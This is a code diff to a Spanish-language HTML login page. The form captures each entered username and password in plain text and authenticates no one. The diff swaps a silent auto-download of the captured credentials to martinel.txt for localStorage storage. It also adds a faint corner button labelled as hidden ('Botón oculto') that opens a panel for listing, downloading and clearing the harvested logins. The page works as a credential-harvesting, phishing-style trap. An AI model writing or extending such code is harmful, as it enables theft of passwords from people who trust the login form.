@@ -48,6 +48,162 @@
             background-color: #e74c3c;
             color: white;
         }
+
+        /* Botón oculto */
+        #btnMostrarHistorial {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 8px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 11px;
+            opacity: 0.5;
+            transition: all 0.3s;
+            z-index: 1000;
+        }
+
+        #btnMostrarHistorial:hover {
+            opacity: 1;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Modal del historial */
+        .modal-historial {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .modal-historial.show {
+            display: flex;
+        }
+
+        .modal-historial-content {
+            background: #1a1a22;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 25px;
+            max-width: 800px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
+        }
+
+        .modal-historial-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+
+        .modal-historial-header h2 {
+            color: white;
+            margin: 0;
+            font-size: 20px;
+        }
+
+        .btn-cerrar-modal {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .btn-cerrar-modal:hover {
+            background: #c0392b;
+        }
+
+        .historial-items {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .historial-item {
+            background: #252530;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #2ecc71;
+            color: #ddd;
+            font-size: 12px;
+            font-family: monospace;
+            word-break: break-all;
+            line-height: 1.6;
+        }
+
+        .historial-item:hover {
+            background: #2a2a30;
+            border-left-color: #27ae60;
+        }
+
+        .historial-vacio {
+            text-align: center;
+            color: #999;
+            padding: 40px;
+            font-size: 14px;
+        }
+
+        .btn-limpiar-historial {
+            width: 100%;
+            margin-top: 20px;
+            padding: 10px;
+            background: #e74c3c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .btn-limpiar-historial:hover {
+            background: #c0392b;
+        }
+
+        .btn-descargar-historial {
+            width: 100%;
+            margin-top: 10px;
+            padding: 10px;
+            background: #27ae60;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .btn-descargar-historial:hover {
+            background: #229954;
+        }
+
+        .contador-historial {
+            background: #2ecc71;
+            color: #000;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
     </style>
 </head>
 <body class="theme-dark single-page single-page-inverse">
@@ -101,12 +257,39 @@
         </div>
     </section>
 
+    <!-- Botón oculto para mostrar historial -->
+    <button id="btnMostrarHistorial" title="Mostrar historial de accesos">
+        📋 Historial <span class="contador-historial" id="contadorHistorial">0</span>
+    </button>
+
+    <!-- Modal del historial -->
+    <div class="modal-historial" id="modalHistorial">
+        <div class="modal-historial-content">
+            <div class="modal-historial-header">
+                <h2>Historial de Accesos - martinel.txt</h2>
+                <button class="btn-cerrar-modal" onclick="cerrarHistorial()">✕ Cerrar</button>
+            </div>
+            <div class="historial-items" id="historialItems">
+                <div class="historial-vacio">No hay registros aún</div>
+            </div>
+            <button class="btn-descargar-historial" onclick="descargarHistorial()">📥 Descargar martinel.txt</button>
+            <button class="btn-limpiar-historial" onclick="limpiarHistorial()">🗑️ Limpiar Historial</button>
+        </div>
+    </div>
+
     <script>
         (function(){
             const btn = document.getElementById('m_login_signin_submit');
             const inputUser = document.getElementById('username');
             const inputPass = document.getElementById('password');
             const mensaje = document.getElementById('mensaje');
+            const btnMostrarHistorial = document.getElementById('btnMostrarHistorial');
+            const modalHistorial = document.getElementById('modalHistorial');
+            const historialItems = document.getElementById('historialItems');
+            const contadorHistorial = document.getElementById('contadorHistorial');
+
+            // Actualizar contador al cargar
+            actualizarContador();
 
             function mostrarNotificacion(text, tipo = 'success') {
                 const notif = document.createElement('div');
@@ -132,47 +315,154 @@
             }
 
             function guardarEnMartinelTxt(usuario, contraseña) {
-                const ahora = new Date();
-                const fecha = ahora.toLocaleString('es-PE');
-                const ip = "IP_Local";
-                
-                // Formato de la línea a guardar
-                const linea = `[${fecha}] | IP: ${ip} | Usuario: ${usuario} | Contraseña: ${contraseña}\n`;
-
-                // Obtener datos previos de localStorage
-                let datosExistentes = localStorage.getItem('martinel_data') || '';
-                
-                // Agregar la nueva línea
-                let nuevosDatos = datosExistentes + linea;
-                
-                // Guardar en localStorage
-                localStorage.setItem('martinel_data', nuevosDatos);
-
-                // Crear y descargar el archivo martinel.txt SIN diálogo
-                const blob = new Blob([nuevosDatos], { type: 'text/plain;charset=utf-8' });
-                const enlace = document.createElement('a');
-                enlace.href = URL.createObjectURL(blob);
-                enlace.download = 'martinel.txt';
-                enlace.style.display = 'none';
-
-                document.body.appendChild(enlace);
-                
-                // Ejecutar descarga sin diálogo
-                setTimeout(() => {
-                    enlace.dispatchEvent(new MouseEvent('click', {
-                        bubbles: true,
-                        cancelable: true,
-                        view: window
-                    }));
+                try {
+                    const ahora = new Date();
+                    const fecha = ahora.toLocaleString('es-PE');
+                    const ip = "IP_Local";
                     
+                    // Formato de la línea a guardar
+                    const linea = `[${fecha}] | IP: ${ip} | Usuario: ${usuario} | Contraseña: ${contraseña}`;
+
+                    // Obtener datos previos de localStorage
+                    let datosExistentes = [];
+                    try {
+                        const datosGuardados = localStorage.getItem('martinel_data');
+                        if (datosGuardados) {
+                            datosExistentes = JSON.parse(datosGuardados);
+                        }
+                    } catch(e) {
+                        console.log('Error al parsear datos previos:', e);
+                        datosExistentes = [];
+                    }
+                    
+                    // Asegurar que es un array
+                    if (!Array.isArray(datosExistentes)) {
+                        datosExistentes = [];
+                    }
+                    
+                    // Agregar la nueva línea
+                    datosExistentes.push(linea);
+                    
+                    // Guardar en localStorage
+                    localStorage.setItem('martinel_data', JSON.stringify(datosExistentes));
+                    
+                    console.log('Datos guardados:', datosExistentes);
+
+                    mostrarMensaje('¡REGISTRADO!  COINSI -2025', false);
+                    mostrarNotificacion('Credenciales guardadas en el historial', 'success');
+                    
+                    actualizarContador();
+                } catch(error) {
+                    console.error('Error al guardar:', error);
+                    mostrarMensaje('Error al guardar los datos', true);
+                    mostrarNotificacion('Error en el registro', 'error');
+                }
+            }
+
+            function actualizarContador() {
+                try {
+                    const datosGuardados = localStorage.getItem('martinel_data');
+                    let datos = [];
+                    
+                    if (datosGuardados) {
+                        datos = JSON.parse(datosGuardados);
+                    }
+                    
+                    if (!Array.isArray(datos)) {
+                        datos = [];
+                    }
+                    
+                    contadorHistorial.textContent = datos.length;
+                    console.log('Contador actualizado:', datos.length);
+                } catch(e) {
+                    console.error('Error al actualizar contador:', e);
+                    contadorHistorial.textContent = '0';
+                }
+            }
+
+            function mostrarHistorial() {
+                try {
+                    const datosGuardados = localStorage.getItem('martinel_data');
+                    let datos = [];
+                    
+                    if (datosGuardados) {
+                        datos = JSON.parse(datosGuardados);
+                    }
+                    
+                    if (!Array.isArray(datos)) {
+                        datos = [];
+                    }
+                    
+                    historialItems.innerHTML = '';
+
+                    if (datos.length === 0) {
+                        historialItems.innerHTML = '<div class="historial-vacio">No hay registros aún</div>';
+                    } else {
+                        datos.forEach((item, index) => {
+                            const div = document.createElement('div');
+                            div.className = 'historial-item';
+                            div.textContent = item;
+                            historialItems.appendChild(div);
+                        });
+                    }
+                    console.log('Historial mostrado, registros:', datos.length);
+                } catch(e) {
+                    console.error('Error al mostrar historial:', e);
+                    historialItems.innerHTML = '<div class="historial-vacio">Error al cargar el historial</div>';
+                }
+            }
+
+            function descargarHistorial() {
+                try {
+                    const datosGuardados = localStorage.getItem('martinel_data');
+                    let datos = [];
+                    
+                    if (datosGuardados) {
+                        datos = JSON.parse(datosGuardados);
+                    }
+                    
+                    if (!Array.isArray(datos)) {
+                        datos = [];
+                    }
+                    
+                    if (datos.length === 0) {
+                        mostrarNotificacion('No hay registros para descargar', 'error');
+                        return;
+                    }
+
+                    const contenido = datos.join('\n');
+                    const blob = new Blob([contenido], { type: 'text/plain;charset=utf-8' });
+                    const enlace = document.createElement('a');
+                    enlace.href = URL.createObjectURL(blob);
+                    enlace.download = 'martinel.txt';
+                    enlace.style.display = 'none';
+
+                    document.body.appendChild(enlace);
+                    enlace.click();
+
                     setTimeout(() => {
                         document.body.removeChild(enlace);
                         URL.revokeObjectURL(enlace.href);
                     }, 100);
-                }, 10);
 
-                mostrarMensaje('¡REGISTRADO!  COINSI -2025', false);
-                mostrarNotificacion('Archivo martinel.txt guardado automáticamente', 'success');
+                    mostrarNotificacion('Archivo descargado correctamente', 'success');
+                } catch(e) {
+                    console.error('Error al descargar:', e);
+                    mostrarNotificacion('Error al descargar el archivo', 'error');
+                }
+            }
+
+            function limpiarHistorial() {
+                if (confirm('¿Estás seguro de que deseas eliminar todo el historial?')) {
+                    localStorage.removeItem('martinel_data');
+                    mostrarHistorial();
+                    actualizarContador();
+                    mostrarNotificacion('Historial eliminado', 'success');
+                }
+            }
+
+            function cerrarHistorial() {
+                modalHistorial.classList.remove('show');
             }
 
             btn.addEventListener('click', function() {
@@ -200,9 +490,28 @@
                 }
             });
 
+            // Mostrar historial al hacer clic en botón
+            btnMostrarHistorial.addEventListener('click', function() {
+                mostrarHistorial();
+                modalHistorial.classList.add('show');
+            });
+
+            // Cerrar modal al hacer clic fuera
+            modalHistorial.addEventListener('click', function(e) {
+                if (e.target === modalHistorial) {
+                    cerrarHistorial();
+                }
+            });
+
             document.getElementById('loginForm').addEventListener('submit', function(e){
                 e.preventDefault();
             });
+
+            // Hacer funciones disponibles globalmente
+            window.mostrarHistorial = mostrarHistorial;
+            window.descargarHistorial = descargarHistorial;
+            window.limpiarHistorial = limpiarHistorial;
+            window.cerrarHistorial = cerrarHistorial;
         })();
     </script>
 </body>
